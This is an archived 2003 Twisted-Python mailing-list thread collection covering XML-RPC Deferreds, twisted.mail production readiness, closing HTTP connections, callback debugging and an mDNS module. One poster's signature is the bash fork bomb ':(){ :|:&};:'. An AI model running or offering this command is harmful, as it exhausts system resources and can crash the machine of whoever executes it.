What do I need to do with the xmlrpc.Handler?

I've taken a look at the unit tests, but there's no sample code that 
actually uses Handler.

vic




From itamar at itamarst.org  Mon Jul 28 20:21:24 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 28 Jul 2003 20:21:24 -0400
Subject: [Twisted-Python] How do I make a Twisted server 'look' like
 it's synchronous?
In-Reply-To: <3E29A8B4-C159-11D7-9E45-00039373D624@mac.com>
References: <20030712181337.16477.qmail@green.zadka.com>
	<3E29A8B4-C159-11D7-9E45-00039373D624@mac.com>
Message-ID: <20030728202124.117281d7.itamar@itamarst.org>

On Mon, 28 Jul 2003 20:11:46 -0400
Victor Ng <vng1 at mac.com> wrote:

> I'm pretty confused with how to write an XMLRPC method that runs for a
> 
> long time.  For example - I have an XMLRPC call that will do a
> database fetch.

Database fetch returns Deferred. Your xml-rpc method can return a
Deferred. I suggest reading the Deferred docs and ignoring Handler.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From vng1 at mac.com  Mon Jul 28 23:07:37 2003
From: vng1 at mac.com (Victor Ng)
Date: Mon, 28 Jul 2003 23:07:37 -0400
Subject: [Twisted-Python] How do I make a Twisted server 'look' like it's synchronous?
In-Reply-To: <20030728202124.117281d7.itamar@itamarst.org>
Message-ID: <CE89A194-C171-11D7-884C-00039373D624@mac.com>

Excellent - I managed to get stuff working using both a simple add 
method and a database call.

Is Handler deprecated?  The API documentation is unclear about using 
(or ignoring) Handler.

vic

On Monday, July 28, 2003, at 08:21  PM, Itamar Shtull-Trauring wrote:

> On Mon, 28 Jul 2003 20:11:46 -0400
> Victor Ng <vng1 at mac.com> wrote:
>
>> I'm pretty confused with how to write an XMLRPC method that runs for a
>>
>> long time.  For example - I have an XMLRPC call that will do a
>> database fetch.
>
> Database fetch returns Deferred. Your xml-rpc method can return a
> Deferred. I suggest reading the Deferred docs and ignoring Handler.
>
> -- 
> Itamar Shtull-Trauring    http://itamarst.org/
> http://www.zoteca.com -- Python & Twisted consulting
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>




From glyph at twistedmatrix.com  Tue Jul 29 00:16:22 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Mon, 28 Jul 2003 23:16:22 -0500
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <3F256989.4020108@zope.com>
Message-ID: <69427200-C17B-11D7-A7D5-000393C9700E@twistedmatrix.com>

On Monday, July 28, 2003, at 01:20 PM, Gary Poster wrote:

> Oh yeah, forgot about that.  I've seen several discussions of the 
> licensing on the Twisted list... Maybe Phil Eby's implementation is 
> the only way out of that one.

The whole point of those discussions has generally been that the 
current structure is important to make relicensing a possibility :-).

While twisted as a whole is being very actively (one might even say 
"agressively") developed, some portions of the framework, like the core 
reactor, seem to be extremely stable at this point.

(Please, chime in if you disagree.)

I have been considering approaching the Python team to ask about 
relicensing / including portions of twisted.internet in core Python at 
some point, since it seems to have eclipsed asyncore in terms of 
popularity, but I am sure that such discussions would be fraught with 
subtle corner cases and versioning issues, and I am very, very short on 
time at the moment.  However, if another member of the Twisted team 
would like to take up this discussion, either about core Python or 
about Zope 3, I'd be more than willing to appoint a proxy.




From radix at twistedmatrix.com  Tue Jul 29 00:28:11 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Tue, 29 Jul 2003 00:28:11 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <69427200-C17B-11D7-A7D5-000393C9700E@twistedmatrix.com>
References: <3F256989.4020108@zope.com> <69427200-C17B-11D7-A7D5-000393C9700E@twistedmatrix.com>
Message-ID: <20030729042811.GA19792@radii>

On Mon, Jul 28, 2003 at 11:16:22PM -0500, Glyph Lefkowitz wrote:
> I have been considering approaching the Python team to ask about 
> relicensing / including portions of twisted.internet in core Python at 
> some point, since it seems to have eclipsed asyncore in terms of 
> popularity, but I am sure that such discussions would be fraught with 
> subtle corner cases and versioning issues, and I am very, very short on 
> time at the moment.  However, if another member of the Twisted team 
> would like to take up this discussion, either about core Python or 
> about Zope 3, I'd be more than willing to appoint a proxy.

I dread the day that parts of Twisted start making it into Python
core. If it ever does, though, I want to "brute-force" the versioning
issue and put it in a top-level package with a name other than
"twisted" (And I'm sure Guido would agree, as he doesn't like names
like "twisted" and "optik"). That way if we continue to develop bits
that are also in Python, there will be no versioning clashes. We've
all seen this issue with the (*flinch* *flinch*) `xml' package.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From bob at redivi.com  Tue Jul 29 01:41:49 2003
From: bob at redivi.com (Bob Ippolito)
Date: Tue, 29 Jul 2003 01:41:49 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <69427200-C17B-11D7-A7D5-000393C9700E@twistedmatrix.com>
Message-ID: <59A227EA-C187-11D7-A8DE-000A95686CD8@redivi.com>

On Tuesday, Jul 29, 2003, at 00:16 America/New_York, Glyph Lefkowitz 
wrote:

>
> On Monday, July 28, 2003, at 01:20 PM, Gary Poster wrote:
>
>> Oh yeah, forgot about that.  I've seen several discussions of the 
>> licensing on the Twisted list... Maybe Phil Eby's implementation is 
>> the only way out of that one.
>
> The whole point of those discussions has generally been that the 
> current structure is important to make relicensing a possibility :-).
>
> While twisted as a whole is being very actively (one might even say 
> "agressively") developed, some portions of the framework, like the 
> core reactor, seem to be extremely stable at this point.

the organization of twisted.internet is the suck

> I have been considering approaching the Python team to ask about 
> relicensing / including portions of twisted.internet in core Python at 
> some point, since it seems to have eclipsed asyncore in terms of 
> popularity, but I am sure that such discussions would be fraught with 
> subtle corner cases and versioning issues, and I am very, very short 
> on time at the moment.  However, if another member of the Twisted team 
> would like to take up this discussion, either about core Python or 
> about Zope 3, I'd be more than willing to appoint a proxy.

Some of twisted should go into core Python, perhaps for 2.4.. but we 
should have better non-select reactors (win32, wx, qt, corefoundation, 
etc.) and cleaned up organization first.

Of course, I need to write the corefoundation reactor, first :)

-bob




From tv at twistedmatrix.com  Tue Jul 29 02:23:02 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Tue, 29 Jul 2003 09:23:02 +0300
Subject: [Twisted-Python] questions about Twisted mail
In-Reply-To: <200307281626.17865.twisted@goldenspud.com>
References: <200307281626.17865.twisted@goldenspud.com>
Message-ID: <20030729062302.GB11245@lapdog>

On Mon, Jul 28, 2003 at 04:26:17PM -0500, Matthew R. Scott wrote:
> Goals
> =====
> 
> Ultimately, I want Twisted mail to support these outcomes from common e-mail
> scenarios:
> 
> POP3 access to account: PASS
> SMTP Mail from outside domain to outside domain: FAIL

	Huh? This means people cannot use vanity domains. That's
	generally not what you want.

	The first SMTP hop for this email is from a machine
	called yin.wanderer.org, and my source domain is still
	twistedmatrix.com.


	If what you want is relay control, the traditional (and good!)
	mechanism for that is knowing what IP addresses belong to your
	organization, accept mail to outside domains only from those
	IP addresses.

> SMTP Mail from outside domain to user: PASS
> SMTP Mail from user to user: PASS
> SMTP Mail from user to outside domain: FAIL
> ESMTP Mail from user to user: PASS
> ESMTP Mail from user to outside domain: PASS

	Umm, I hope you do mean _authenticated (E)SMTP_, not just
	ESMTP? Because the only real difference between SMTP and ESMTP
	is whether the client says HELO or EHLO.



	I've said this earlier, and I'll say it again. twisted.mail is
	not really ready for production use yet. It can still lose
	email.

> Are any of the problems I'm running into (such as the "No checker for
> ...IUsernameHashedPassword" failure) due to the transitional nature of
> Twisted CVS?   (I freely admit I have not yet tried any of the above on the
> last "stable" Twisted release)

	Most likely yes.

> How close is IMAP server capability to being integrated with Twisted mail?

	See twisted.protocols.imap4.IMAP4Server. Seems to be quite complete.

> How would one keep usernames on different domains separate in terms of
>  logging in with POP3 and authenticating with ESMTP?  E.g. "jdoe at domain1.com"
>  and "jdoe at domain2.com"

	By authenticating as jdoe at domain1.com, not as joe.

	For older netscape atleast, if the POP account had '@' in it,
	it parsed it as user at popserver; that is, it thought
	domain1.com was it's POP server, and authenticated as user
	jdoe. The classic fix is to use user%domain1.com.

> What are some common configurations of Twisted mail that are currently
> deployed in production environments?

	Scalemail is quite close to first real deployment. It uses parts
	of twisted.mail. http://scalemail.sf.net/  (I really need to update
	the web site ;)

-- 
:(){ :|:&};:



From mporter at despammed.com  Tue Jul 29 08:55:30 2003
From: mporter at despammed.com (Michael Porter)
Date: Tue, 29 Jul 2003 13:55:30 +0100
Subject: [Twisted-Python] how to drop connection
Message-ID: <006f01c355d0$b163eba0$0201a8c0@dan>

Hi,

I'm trying to close down a web server (wihout closing the application) but
am having problems closing already established connections.

I'm using port.stopListening() which closes the port and stops the factory
but this doesn't seem to close already established connections. So, if I
then get another request from an established connection, an attempt is made
to service the request. This causes a few problems including
"AttributeError: Site instance has no attribute 'logFile'" from HTTPFactory
because it deleted its logFile attribute when stopFactory was called.

Does anyone know how I can close these established connections?

Thanks,

Mike.




From justinjohnson at fastmail.fm  Tue Jul 29 09:12:03 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Tue, 29 Jul 2003 07:12:03 -0600
Subject: [Twisted-Python] callback wierdness
Message-ID: <20030729131204.08ED9387C2@www.fastmail.fm>

In the attached files I defined process.openProcess to spawn a process
using the reactor, and return a deferred from within my ProcessProtocol. 
Then in trigger.py I define methods "make" and "remove" that utilize
process.openProcess to run a command.  make() adds callbacks to the
deferred to display the results of the execution, and at the bottom of
trigger.py I add a callback to remove the trigger after creating it.

The problem is, none of my callbacks ever get called.  The initial
spawnProcess works and I can see the trigger is created, but nothing is
printed to the screen (callback 1 added in "make") and the trigger is not
removed (callback 2 added at end of file).

Can someone tell me what I'm doing wrong here?  Also, is spawnProcess a
special case that actually runs before reactor.run is called?  That is
what I am seeing, and I'm not sure if that makes sense.  Just trying to
get my head around this.

Thanks much.
-Justin
-------------- next part --------------
A non-text attachment was scrubbed...
Name: trigger.py
Type: application/unknown
Size: 2888 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030729/e1d9d5e1/attachment.bin 
-------------- next part --------------
A non-text attachment was scrubbed...
Name: process.py
Type: application/unknown
Size: 1619 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030729/e1d9d5e1/attachment-0001.bin 

From glyph at twistedmatrix.com  Tue Jul 29 10:25:47 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Tue, 29 Jul 2003 09:25:47 -0500
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <20030729042811.GA19792@radii>
Message-ID: <8C2C58E0-C1D0-11D7-A7D5-000393C9700E@twistedmatrix.com>

On Monday, July 28, 2003, at 11:28 PM, Christopher Armstrong wrote:

> I dread the day that parts of Twisted start making it into Python
> core.

Why?  The core reactor is pretty stable, pretty small, and now people 
who have expressed distress at the state of other portions of Twisted 
want to use it.

> If it ever does, though, I want to "brute-force" the versioning
> issue and put it in a top-level package with a name other than
> "twisted"

Agreed.

> (And I'm sure Guido would agree, as he doesn't like names
> like "twisted" and "optik").

Maybe we can call it 'reactor.*'?  (Or, for all you Sw. Eng. fans out 
there, "patterns.reactor.*" :-))

> That way if we continue to develop bits that are also in Python, there 
> will be no versioning clashes. We've all seen this issue with the 
> (*flinch* *flinch*) `xml' package.

Yes, please, let's let application authors choose WHICH version of this 
they want to run with; ostensibly the core Python version would be much 
more stable, and upgrades to it could happen with excruciating 
attention to backwards compat.




From glyph at twistedmatrix.com  Tue Jul 29 10:28:37 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Tue, 29 Jul 2003 09:28:37 -0500
Subject: [Twisted-Python] Inheriting Environment (was: Wrapping blocking code)
In-Reply-To: <20030728.115022.109875724.warner@lothar.com>
Message-ID: <F1634438-C1D0-11D7-A7D5-000393C9700E@twistedmatrix.com>

On Monday, July 28, 2003, at 01:50 PM, Brian Warner wrote:

> We've talked about this briefly before, but perhaps [child processes 
> inheriting the environment of their parents] should be the default?

I think that the current behavior is fine, and that it shouldn't 
change.  Better to err on the side of safety for something like this; 
make it a FAQ, but it's a better FAQ than "I ran a CGI as www-data with 
the wrong $HOME variable and a web user deleted my entire home 
directory!  What do I do?!?"




From twisted at goldenspud.com  Tue Jul 29 11:27:52 2003
From: twisted at goldenspud.com (Matthew Scott)
Date: Tue, 29 Jul 2003 10:27:52 -0500
Subject: [Twisted-Python] questions about Twisted mail
In-Reply-To: <20030729062302.GB11245@lapdog>
References: <200307281626.17865.twisted@goldenspud.com> <20030729062302.GB11245@lapdog>
Message-ID: <200307291027.52181.twisted@goldenspud.com>

On Tue 2003-07-29 01:23, Tommi Virtanen wrote:
> > POP3 access to account: PASS
> > SMTP Mail from outside domain to outside domain: FAIL
> 	Huh? This means people cannot use vanity domains. That's
> 	generally not what you want.
>       [ ... ]
> 	If what you want is relay control, the traditional (and good!)
> 	mechanism for that is knowing what IP addresses belong to your
> 	organization, accept mail to outside domains only from those
> 	IP addresses.

Yes, it was relay control I was looking for.  I have seen some ISPs use SMTP 
AUTH to control relaying, but for our use of an e-mail server it will be fine 
to limit by IP addresses.  (That will also alleviate silly tech support 
issues that would arise from requiring SMTP AUTH :)


> 	Umm, I hope you do mean _authenticated (E)SMTP_, not just
> 	ESMTP? Because the only real difference between SMTP and ESMTP
> 	is whether the client says HELO or EHLO.

Yes.  Thank you :)  To put what I mentioned in my original e-mail another way, 
I haven't kept my brain up to spec regarding the details of SMTP vs ESMTP and 
where AUTH falls in, as well as related RFCs.  :)


> 	I've said this earlier, and I'll say it again. twisted.mail is
> 	not really ready for production use yet. It can still lose
> 	email.

That alone tells me that in the short term any efforts to use the existing 
Twisted mail would not be useful, and that I should be researching the use of 
more 'traditional' email server configurations :)

I might have perhaps run across this if I did an extensive search in the 
mailing list archives, but my resource was grepping the Twisted CVS for 
'twisted mail'.  The only thing I ran across that had any depth to its 
description was doc/historic/2002/ipc10/twisted-network-framework/index.html 
and it had no mention of not using Twisted mail in a production environment.

I'm not saying that it's a bad thing that I couldn't find more definitive 
information -- after all if something is not ready for production use then 
it's probably not a good thing to give people lots of easy ways to believe 
that it is :)


> > How would one keep usernames on different domains separate in terms of
> >  logging in with POP3 and authenticating with ESMTP?  E.g.
> > "jdoe at domain1.com" and "jdoe at domain2.com"
> 	By authenticating as jdoe at domain1.com, not as joe.

'tis what I tried...

+OK <20030729152108.1218.1275775558 at advocate>
USER test
+OK USER accepted, send PASS
PASS 1234
+OK Authentication succeeded

+OK <20030729152118.1218.400479354 at advocate>
USER test at test.example.com
+OK USER accepted, send PASS
PASS 1234
-ERR Authentication failed

+OK <20030729152133.1218.265884954 at advocate>
USER test%test.example.com
+OK USER accepted, send PASS
PASS 1234
-ERR Authentication failed


> 	Scalemail is quite close to first real deployment. It uses parts
> 	of twisted.mail. http://scalemail.sf.net/  (I really need to update
> 	the web site ;)

I will take a look at this and see what I can glean from it. I see CVS commits 
in the last 2 months, and a 'debian' directory in there, so I'm happy even if 
the website isn't up-to-date :-D

Thanks for the link and the info on the status of Twisted mail!


-- 
Matthew R. Scott
OMAjA / http://www.omaja.com/




From itamar at itamarst.org  Tue Jul 29 12:24:08 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Tue, 29 Jul 2003 12:24:08 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <8C2C58E0-C1D0-11D7-A7D5-000393C9700E@twistedmatrix.com>
References: <20030729042811.GA19792@radii>
	<8C2C58E0-C1D0-11D7-A7D5-000393C9700E@twistedmatrix.com>
Message-ID: <20030729122408.714deb8a.itamar@itamarst.org>

On Tue, 29 Jul 2003 09:25:47 -0500
Glyph Lefkowitz <glyph at twistedmatrix.com> wrote:

> 
> On Monday, July 28, 2003, at 11:28 PM, Christopher Armstrong wrote:
> 
> > I dread the day that parts of Twisted start making it into Python
> > core.
> 
> Why?  The core reactor is pretty stable, pretty small, and now people 
> who have expressed distress at the state of other portions of Twisted 
> want to use it.

Up to a point, we've still been fixing bugs left and right. Obscure
bugs, but bugs none the less. And the SSL refactor was not too long ago
(Two months ago?). When we haven't made any major changes for 6 months,
then we can talk about it.



From twisted at goldenspud.com  Tue Jul 29 12:20:55 2003
From: twisted at goldenspud.com (Matthew R. Scott)
Date: Tue, 29 Jul 2003 11:20:55 -0500
Subject: [Twisted-Python] questions about Twisted mail
In-Reply-To: <20030729062302.GB11245@lapdog>
References: <200307281626.17865.twisted@goldenspud.com> <20030729062302.GB11245@lapdog>
Message-ID: <200307291120.55120.twisted@goldenspud.com>

Followup query...

On Tue 2003-07-29 01:23, Tommi Virtanen wrote:
> 	I've said this earlier, and I'll say it again. twisted.mail is
> 	not really ready for production use yet. It can still lose
> 	email.

Is there any current plan for bringing twisted.mail up to spec for production 
use?  In other words, is it known what can cause it to lose mail?  and if 
that is known, what kind of work would it take to fix that?

Are there other things that prevent its use, even in a limited form, in a 
production environment?

The project I am helping with that would potentially use twisted.mail is 99% 
twisted-based right now and it would be great to keep that trend going since 
twisted has been so useful for everything else we've used it for.  :)

We can certainly use a different solution for a mail server if need be for the 
short term, but we would be more delighted to be able to help twisted.mail 
fill the role of 'production mail server' for both us and others...

Thanks again, 

-- 
Matthew R. Scott
OMAjA / http://www.omaja.com/




From itamar at itamarst.org  Tue Jul 29 12:36:48 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Tue, 29 Jul 2003 12:36:48 -0400
Subject: [Twisted-Python] questions about Twisted mail
In-Reply-To: <200307291120.55120.twisted@goldenspud.com>
References: <200307281626.17865.twisted@goldenspud.com>
	<20030729062302.GB11245@lapdog>
	<200307291120.55120.twisted@goldenspud.com>
Message-ID: <20030729123648.6e4ca5bc.itamar@itamarst.org>

On Tue, 29 Jul 2003 11:20:55 -0500
"Matthew R. Scott" <twisted at goldenspud.com> wrote:

> Followup query...
> 
> On Tue 2003-07-29 01:23, Tommi Virtanen wrote:
> > 	I've said this earlier, and I'll say it again. twisted.mail is
> > 	not really ready for production use yet. It can still lose
> > 	email.
> 
> Is there any current plan for bringing twisted.mail up to spec for
> production use?  In other words, is it known what can cause it to lose
> mail?  and if that is known, what kind of work would it take to fix
> that?

It's not that it loses mail, though it might do so. It's that we haven't
tested it enough to be certain of its stability (it hasn't been used
enough to be trust worthy). So it might have a bug which causes mail
loss and we wouldn't know about it.

Jean-Paul Calderone is currently putting a lot of work into all of
Twisted's mail code (protocol support and twisted.mail). He would be the
person to talk to in terms of missing functionality, help needed and
potential issues, etc.. But he's on vacation for a week.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From glyph at twistedmatrix.com  Tue Jul 29 17:08:49 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Tue, 29 Jul 2003 16:08:49 -0500
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <20030729122408.714deb8a.itamar@itamarst.org>
Message-ID: <D9B32A19-C208-11D7-A7D5-000393C9700E@twistedmatrix.com>

On Tuesday, July 29, 2003, at 11:24 AM, Itamar Shtull-Trauring wrote:

> Up to a point, we've still been fixing bugs left and right. Obscure
> bugs, but bugs none the less. And the SSL refactor was not too long ago
> (Two months ago?). When we haven't made any major changes for 6 months,
> then we can talk about it.

Well, with 18 months to go, I think that's pretty reasonable ;-)




From andrew-twisted at puzzling.org  Tue Jul 29 21:47:26 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Wed, 30 Jul 2003 11:47:26 +1000
Subject: [Twisted-Python] callback wierdness
In-Reply-To: <20030729131204.08ED9387C2@www.fastmail.fm>
References: <20030729131204.08ED9387C2@www.fastmail.fm>
Message-ID: <20030730014725.GA27662@frobozz>

On Tue, Jul 29, 2003 at 07:12:03AM -0600, Justin Johnson wrote:
> In the attached files I defined process.openProcess to spawn a process
> using the reactor, and return a deferred from within my ProcessProtocol. 
> Then in trigger.py I define methods "make" and "remove" that utilize
> process.openProcess to run a command.  make() adds callbacks to the
> deferred to display the results of the execution, and at the bottom of
> trigger.py I add a callback to remove the trigger after creating it.
> 
> The problem is, none of my callbacks ever get called.  The initial
> spawnProcess works and I can see the trigger is created, but nothing is
> printed to the screen (callback 1 added in "make") and the trigger is not
> removed (callback 2 added at end of file).

Without looking closely, I notice that you never add an errback to your
Deferreds, only callbacks.  Try d.addErrback(twisted.python.log.err), and
see if that helps you figure out what's going wrong.

-Andrew.




From sflist at ihonk.com  Wed Jul 30 00:51:47 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Tue, 29 Jul 2003 21:51:47 -0700
Subject: [Twisted-Python] twisted.web.xmlrpc doesn't generate content length header
Message-ID: <200307292151.47437.sflist@ihonk.com>

Hi all,

I'm experimenting with a C++ XML-RPC client library, and it refused to talk to 
my Twisted sample server. Why? It reported that no content length was given, 
so it gave up and sulked. So I dumped what Twisted coughed up, and sure 
enough, it's lacking a content length field (I'm calling the sample 
xmlrpc_add(self, a, b) function):

HTTP/1.0 200 OK
Date: Wed, 30 Jul 2003 04:41:56 GMT
Content-type: text/xml
Server: TwistedWeb/1.0.6

<?xml version='1.0'?>
<methodResponse>
<params>
<param>
<value><int>3</int></value>
</param>
</params>
</methodResponse>
Connection closed by foreign host.

Could it be that I'm doing something wrong? The XML-RPC spec states that the 
server must respond with a correct content length, so I would've expected 
Twisted to behave accordingly. So am I missing something, or does Twisted not 
comply with the spec (as Dave Winer defines it)?

Thanks,

Steve

P.S. For the DW-standard inclined, see http://www.xml-rpc.com/spec, under 
"Response format."



From andrew-twisted at puzzling.org  Wed Jul 30 01:05:43 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Wed, 30 Jul 2003 15:05:43 +1000
Subject: [Twisted-Python] twisted.web.xmlrpc doesn't generate content length header
In-Reply-To: <200307292151.47437.sflist@ihonk.com>
References: <200307292151.47437.sflist@ihonk.com>
Message-ID: <20030730050543.GB27662@frobozz>

On Tue, Jul 29, 2003 at 09:51:47PM -0700, Steve Freitas wrote:
> Hi all,
> 
> I'm experimenting with a C++ XML-RPC client library, and it refused to talk to 
> my Twisted sample server. Why? It reported that no content length was given, 

Fixed 3 days ago in CVS:
    http://twistedmatrix.com/users/jh.twistd/viewcvs/cgi/viewcvs.cgi/twisted/web/xmlrpc.py?rev=1.27&content-type=text/vnd.viewcvs-markup&cvsroot=Twisted

Thanks for the bug report, anyway :)

-Andrew.




From sflist at ihonk.com  Wed Jul 30 01:13:08 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Tue, 29 Jul 2003 22:13:08 -0700
Subject: [Twisted-Python] twisted.web.xmlrpc doesn't generate content
	length header
In-Reply-To: <20030730050543.GB27662@frobozz>
Message-ID: <BB4CA1F4.B273%sflist@ihonk.com>

> Fixed 3 days ago in CVS:
> 
> Thanks for the bug report, anyway :)

D'oh! Thanks!

Steve




From warner at lothar.com  Wed Jul 30 02:33:37 2003
From: warner at lothar.com (Brian Warner)
Date: Tue, 29 Jul 2003 23:33:37 -0700 (PDT)
Subject: [Twisted-Python] how to drop connection
References: <006f01c355d0$b163eba0$0201a8c0@dan>
Message-ID: <20030729.233337.132512789.warner@lothar.com>

"Michael Porter" <mporter at despammed.com> writes:
> 
> I'm trying to close down a web server (wihout closing the application) but
> am having problems closing already established connections.

Maybe something like this? (note: completely untested):

class DroppingHTTPChannel(http.HTTPChannel):

    def connectionMade(self):
        http.HTTPChannel.connectionMade(self)
        self.factory.currentConnections.append(self)

    def connectionLost(self, reason):
        http.HTTPChannel.connectionLost(self, reason)
        self.factory.currentConnections.remove(self)

class DroppingHTTPFactory(http.HTTPFactory):

    currentConnections = []
    protocol = DroppingHTTPChannel

    def stopFactory(self):
        http.HTTPFactory.stopFactory(self)
        for p in self.currentConnections:
            p.transport.loseConnection()

hope that seems useful..
 -Brian



From andrew-twisted at puzzling.org  Wed Jul 30 02:41:00 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Wed, 30 Jul 2003 16:41:00 +1000
Subject: [Twisted-Python] how to drop connection
In-Reply-To: <20030729.233337.132512789.warner@lothar.com>
References: <006f01c355d0$b163eba0$0201a8c0@dan> <20030729.233337.132512789.warner@lothar.com>
Message-ID: <20030730064100.GC27662@frobozz>

On Tue, Jul 29, 2003 at 11:33:37PM -0700, Brian Warner wrote:
> "Michael Porter" <mporter at despammed.com> writes:
> > 
> > I'm trying to close down a web server (wihout closing the application) but
> > am having problems closing already established connections.
> 
> Maybe something like this? (note: completely untested):

This technique looks feasible to me, except:

> class DroppingHTTPFactory(http.HTTPFactory):
> 
>     currentConnections = []
>     protocol = DroppingHTTPChannel
> 
>     def stopFactory(self):
>         http.HTTPFactory.stopFactory(self)
>         for p in self.currentConnections:
>             p.transport.loseConnection()

This really should be (also untested):

class DroppingHTTPFactory(http.HTTPFactory):

    protocol = DroppingHTTPChannel

    def startFactory(self):
        http.HTTPFactory.startFactory(self)
        self.currentConnections = []

    def stopFactory(self):
        http.HTTPFactory.stopFactory(self)
        for p in self.currentConnections:
            p.transport.loseConnection()

So that you can have multiple DroppingHTTPFactories without them interfering
with each other.

-Andrew.




From radix at twistedmatrix.com  Wed Jul 30 02:52:48 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 30 Jul 2003 02:52:48 -0400
Subject: [Twisted-Python] how to drop connection
In-Reply-To: <20030730064100.GC27662@frobozz>
References: <006f01c355d0$b163eba0$0201a8c0@dan> <20030729.233337.132512789.warner@lothar.com> <20030730064100.GC27662@frobozz>
Message-ID: <20030730065248.GB26034@radii>

On Wed, Jul 30, 2003 at 04:41:00PM +1000, Andrew Bennetts wrote:
> On Tue, Jul 29, 2003 at 11:33:37PM -0700, Brian Warner wrote:
> >
> > class DroppingHTTPFactory(http.HTTPFactory):
>
> This really should be (also untested):
> 
> class DroppingHTTPFactory(http.HTTPFactory):

Also, OP is probably using server.Site, not HTTPFactory directly. So
it should probably be subclassing that.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From justinjohnson at fastmail.fm  Wed Jul 30 08:59:17 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Wed, 30 Jul 2003 06:59:17 -0600
Subject: [Twisted-Python] callback wierdness
In-Reply-To: <20030730014725.GA27662@frobozz>
References: <20030729131204.08ED9387C2@www.fastmail.fm> <20030730014725.GA27662@frobozz>
Message-ID: <20030730125917.18BA6356A6@www.fastmail.fm>

Found my problem, and indeed I *did* need to add the errback to discover
it.  Thanks again.  :-)

On Wed, 30 Jul 2003 11:47:26 +1000, "Andrew Bennetts"
<andrew-twisted at puzzling.org> said:
> On Tue, Jul 29, 2003 at 07:12:03AM -0600, Justin Johnson wrote:
> > In the attached files I defined process.openProcess to spawn a process
> > using the reactor, and return a deferred from within my ProcessProtocol. 
> > Then in trigger.py I define methods "make" and "remove" that utilize
> > process.openProcess to run a command.  make() adds callbacks to the
> > deferred to display the results of the execution, and at the bottom of
> > trigger.py I add a callback to remove the trigger after creating it.
> > 
> > The problem is, none of my callbacks ever get called.  The initial
> > spawnProcess works and I can see the trigger is created, but nothing is
> > printed to the screen (callback 1 added in "make") and the trigger is not
> > removed (callback 2 added at end of file).
> 
> Without looking closely, I notice that you never add an errback to your
> Deferreds, only callbacks.  Try d.addErrback(twisted.python.log.err), and
> see if that helps you figure out what's going wrong.
> 
> -Andrew.
> 
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> 



From screwtape at froup.com  Wed Jul 30 09:02:40 2003
From: screwtape at froup.com (screwtape at froup.com)
Date: Wed, 30 Jul 2003 23:02:40 +1000
Subject: [Twisted-Python] Twisted and Rendezvous
Message-ID: <20030730130240.GC25612@ferd2.thristian.org>

A few weeks ago, someone on the list mentioned Rendezvous support for
Twisted. Curious, I picked up the Rendezvous specification documents,
and got to hacking.

What I've got so far is almost half a multicast DNS responder. The
multicast DNS specification covers two main areas - asking other hosts
for DNS records and serving out DNS records yourself. My code at the
moment sends out queries and caches the responses in more or less the
proper fashion, but does not respond to requests.

The upshot of all this is that you can look things up over multicast
DNS, but you can't advertise your own services.

The code was written on Linux and tested against Mac OS X 10.2.6
(it'll never run on OS X or any other operating system that includes a
Rendezvous service), and seems to Do The Right Thing.

You can find a nice tarball here:

	http://members.optusnet.com.au/thristian/mDNS-0.5.tar.gz

It contains the main module (mDNS.py) and a simple API demonstration
(mDNS-test.py). There's lots of comments and docstrings, so it
shouldn't be too hard to figure things out.

If you're interested in Rendezvous support for Python, download it and
have a play, then tell me what you think. 

-- 
 ___________ ___________________________________
| Screwtape | http://livejournal.com/~thristian |______ _____ ___ __ _  _   _    _
|
| "At 640x480 the world is peaceful 'cos noone can see well enough to aim"
|



From andrew-twisted at puzzling.org  Wed Jul 30 09:44:05 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Wed, 30 Jul 2003 23:44:05 +1000
Subject: [Twisted-Python] Moshe wins the 1000th test award!
Message-ID: <20030730134405.GA28786@frobozz>

Ok, so there's no prize.  But one of Moshe's recent checkins brought us over
the 1000 tests mark, as judged by BuildBot:
    http://twistematrix.com/buildbot/

Woohoo! :)

-Andrew.




From jgoerzen at complete.org  Wed Jul 30 10:29:14 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Wed, 30 Jul 2003 09:29:14 -0500
Subject: [Twisted-Python] Debugging client programs
Message-ID: <871xw8dr5x.fsf@complete.org>

Hello,

I found the information at
